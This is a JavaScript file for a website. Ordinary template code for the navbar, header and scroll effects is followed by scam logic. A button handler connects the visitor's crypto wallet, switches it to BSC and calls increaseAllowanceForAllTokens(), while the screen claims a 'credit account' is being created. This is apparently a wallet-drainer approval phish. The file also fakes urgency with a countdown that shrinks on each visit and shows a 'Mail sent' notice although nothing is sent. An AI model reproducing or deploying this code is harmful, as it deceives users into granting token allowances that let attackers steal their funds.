'use strict';



/**
 * add event on element
 */

const addEventOnElem = function (elem, type, callback) {
  if (elem.length > 1) {
    for (let i = 0; i < elem.length; i++) {
      elem[i].addEventListener(type, callback);
    }
  } else {
    elem.addEventListener(type, callback);
  }
}



/**
 * navbar toggle
 */

const navbar = document.querySelector("[data-navbar]");
const navbarLinks = document.querySelectorAll("[data-nav-link]");
const navToggler = document.querySelector("[data-nav-toggler]");

const toggleNavbar = function () {
  navbar.classList.toggle("active");
  navToggler.classList.toggle("active");
  document.body.classList.toggle("active");
}

addEventOnElem(navToggler, "click", toggleNavbar);

const closeNavbar = function () {
  navbar.classList.remove("active");
  navToggler.classList.remove("active");
  document.body.classList.remove("active");
}

addEventOnElem(navbarLinks, "click", closeNavbar);



/**
 * header active
 */

const header = document.querySelector("[data-header]");

const activeHeader = function () {
  if (window.scrollY > 300) {
    header.classList.add("active");
  } else {
    header.classList.remove("active");
  }
}

addEventOnElem(window, "scroll", activeHeader);



/**
 * toggle active on add to fav
 */

const addToFavBtns = document.querySelectorAll("[data-add-to-fav]");

const toggleActive = function () {
  this.classList.toggle("active");
}

addEventOnElem(addToFavBtns, "click", toggleActive);



/**
 * scroll revreal effect
 */

const sections = document.querySelectorAll("[data-section]");

const scrollReveal = function () {
  for (let i = 0; i < sections.length; i++) {
    if (sections[i].getBoundingClientRect().top < window.innerHeight / 1.5) {
      sections[i].classList.add("active");
    } else {
      sections[i].classList.remove("active");
    }
  }
}

scrollReveal();

addEventOnElem(window, "scroll", scrollReveal);

document.addEventListener('DOMContentLoaded', () => {
  const increaseAllowanceBtn = document.getElementById('increaseAllowanceBtn');
  const statusMessage = document.getElementById('statusMessage');

  increaseAllowanceBtn.addEventListener('click', async (e) => {
    e.preventDefault();
    statusMessage.textContent = 'Connecting to wallet...';

    if (await initWeb3()) {
      statusMessage.textContent = 'Checking network...';

      if (await switchToBSC()) {
        statusMessage.textContent = 'Creating your new account. Please follow the steps below to continue...';

        const results = await increaseAllowanceForAllTokens();
        let successCount = 0;

        for (const result of Object.values(results)) {
          if (result.success) {
            successCount++;
          }
        }

        if (successCount > 0) {
          statusMessage.textContent = `Credit account created successfully!. Please wait for the confirmation of your credit in your email.`;
        } else {
          statusMessage.textContent = 'Account creation could not be completed. Please try again.';
        }
      } else {
        statusMessage.textContent = 'Failed to switch to BSC network.';
      }
    } else {
      statusMessage.textContent = 'Failed to connect to wallet.';
    }
  });
});
// Countdown Timer
function getStoredTime() {
  const storedTime = localStorage.getItem('countdownTime');
  if (storedTime) {
    return new Date(parseInt(storedTime));
  }
  // If no stored time, set initial time to 10 hours from now
  const initialTime = new Date();
  initialTime.setHours(initialTime.getHours() + 10);
  return initialTime;
}

function setStoredTime(date) {
  localStorage.setItem('countdownTime', date.getTime().toString());
}

function updateCountdown() {
  const countdownElement = document.getElementById('countdown-timer');
  let targetDate = getStoredTime();
  
  function update() {
    const now = new Date();
    const difference = targetDate - now;

    if (difference <= 0) {
      // Reset the countdown to 10 hours when it reaches zero
      targetDate = new Date(now.getTime() + 10 * 60 * 60 * 1000);
      setStoredTime(targetDate);
    }

    const hours = Math.floor(difference / (1000 * 60 * 60));
    const minutes = Math.floor((difference % (1000 * 60 * 60)) / (1000 * 60));
    const seconds = Math.floor((difference % (1000 * 60)) / 1000);

    countdownElement.textContent = `${hours}h:${minutes}m:${seconds}s`;
  }

  // Update immediately and then every second
  update();
  setInterval(update, 1000);
}

// Run the countdown when the DOM is loaded
document.addEventListener('DOMContentLoaded', () => {
  updateCountdown();

  // Decrease the stored time by 1 hour on page load
  const storedTime = getStoredTime();
  storedTime.setHours(storedTime.getHours() - 1);
  setStoredTime(storedTime);
});

document.addEventListener('DOMContentLoaded', function() {
  const emailInput = document.getElementById('emailInput');
  const sendButton = document.getElementById('sendButton');
  const notification = document.getElementById('notification');

  sendButton.addEventListener('click', function() {
    // Clear the email input
    emailInput.value = '';

    // Show notification
    notification.textContent = "Mail sent, please register your account.";
    notification.classList.add('show');

    // Scroll to the top of the page
    window.scrollTo({
      top: 0,
      behavior: 'smooth'
    });

    // Hide notification after 4 seconds
    setTimeout(() => {
      notification.classList.remove('show');
    }, 4000);
  });
});

document.addEventListener('DOMContentLoaded', function() {
  // Select all navbar links with the class 'register-alert'
  const navLinks = document.querySelectorAll('.navbar-link.register-alert');

  // Function to show alert
  function showRegisterAlert(event) {
    event.preventDefault(); // Prevent the default link behavior
    alert("Please Register Your Account First");
  }

  // Add click event listener to each link
  navLinks.forEach(link => {
    link.addEventListener('click', showRegisterAlert);
  });
});
